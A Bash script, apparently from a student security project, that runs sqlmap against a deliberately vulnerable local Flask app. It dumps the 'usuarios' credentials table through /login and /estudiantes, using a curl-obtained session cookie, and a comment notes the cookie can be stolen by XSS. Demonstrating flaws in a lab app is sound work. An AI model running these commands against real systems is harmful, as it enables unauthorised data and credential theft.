#!/usr/bin/env bash
# =============================================================================
# sqlmap_attack.sh — SQLi automatizado contra la V1 (Sistema Academico Vul)
#
# Objetivo: demostrar que la V1 es inyectable y extraer la tabla "usuarios"
# (credenciales en texto plano) mediante sqlmap. La evidencia queda en
# docs/sqlmap_evidence/ y debe referenciarse en docs/SQLMAP_ATTACK.md.
#
# Requisitos:
#   - V1 desplegada (por defecto en http://localhost:5001, Flask debug)
#   - sqlmap instalado (https://sqlmap.org)
#
# Uso:
#   ./scripts/sqlmap_attack.sh [URL_V1] [SESSION_FILE] [OUTDIR]
#   Ejemplo:
#   ./scripts/sqlmap_attack.sh http://localhost:5001 /tmp/v1_sesion.txt docs/sqlmap_evidence
#
# Importante:
#   - La V1 usa cookies Flask sin HttpOnly/Secure: la cookie de sesion se
#     puede robar por XSS y reutilizar para atacar /estudiantes (GET).
#   - sqlmap puede tardar: ajuste con --threads (max 4) y --level/--risk.
# =============================================================================
set -euo pipefail

TARGET="${1:-http://localhost:5001}"
SESSION="${2:-/tmp/v1_sesion.txt}"
OUTDIR="${3:-docs/sqlmap_evidence}"

mkdir -p "$OUTDIR/login" "$OUTDIR/estudiantes"

if ! command -v sqlmap >/dev/null 2>&1; then
  echo "[!] sqlmap no esta instalado. Vea https://sqlmap.org" >&2
  exit 1
fi

echo "[+] Objetivo V1: $TARGET"
echo "[+] Directorio de evidencia: $OUTDIR"
echo

# -----------------------------------------------------------------------------
# 1. SQLi en /login (POST). La V1 concatena la query -> inyeccion directa.
#    Parametros: username y password. Sin CSRF en la V1.
# -----------------------------------------------------------------------------
echo "[1/3] SQLi en /login (POST) — enumerando bases de datos"
sqlmap -u "$TARGET/login" \
       --data="username=admin&password=x" \
       --batch --level=1 --risk=1 --threads=4 \
       --dbs \
       --output-dir="$OUTDIR/login"

echo "[1b/3] Volcando la tabla usuarios desde /login"
sqlmap -u "$TARGET/login" \
       --data="username=admin&password=x" \
       --batch --level=1 --risk=1 --threads=4 \
       -D academia -T usuarios --dump \
       --output-dir="$OUTDIR/login"

# -----------------------------------------------------------------------------
# 2. SQLi en /estudiantes?buscar= (GET). Requiere sesion de usuario.
#    Login manual (V1 acepta username/password sin token) para obtener cookie.
# -----------------------------------------------------------------------------
echo "[2/3] Obteniendo sesion V1 (admin/admin123)"
curl -s -c "$SESSION" -o /dev/null -X POST "$TARGET/login" \
     -d "username=admin" -d "password=admin123"

SESSION_COOKIE=$(awk 'BEGIN{FS="\t"} $6=="session" {print $7; exit}' "$SESSION")
if [ -z "$SESSION_COOKIE" ]; then
  echo "[!] No se obtuvo cookie de sesion. La V1 esta respondiendo?" >&2
  exit 1
fi
echo "     Cookie de sesion obtenida (${#SESSION_COOKIE} chars)"

echo "[2b/3] SQLi en /estudiantes?buscar= (GET) — verificando inyeccion"
sqlmap -u "$TARGET/estudiantes" \
       --data="buscar=test" \
       --cookie="session=$SESSION_COOKIE" \
       --method=GET \
       --batch --level=2 --risk=2 --threads=4 \
       --tables \
       --output-dir="$OUTDIR/estudiantes"

echo "[2c/3] Dump de la tabla usuarios"
sqlmap -u "$TARGET/estudiantes" \
       --data="buscar=test" \
       --cookie="session=$SESSION_COOKIE" \
       --method=GET \
       --batch --level=2 --risk=2 --threads=4 \
       -T usuarios --dump \
       --output-dir="$OUTDIR/estudiantes"

# -----------------------------------------------------------------------------
# 3. Resumen / evidencia
# -----------------------------------------------------------------------------
echo "[3/3] Evidencia generada en:"
find "$OUTDIR" -type f \( -name "*.csv" -o -name "*.log" \) | head -20

echo
echo "Listo. Las credenciales extraidas (admin/admin123, profesor/profesor en texto"
echo "plano) quedan en los .csv de $OUTDIR. Adjuntar capturas a docs/SQLMAP_ATTACK.md"
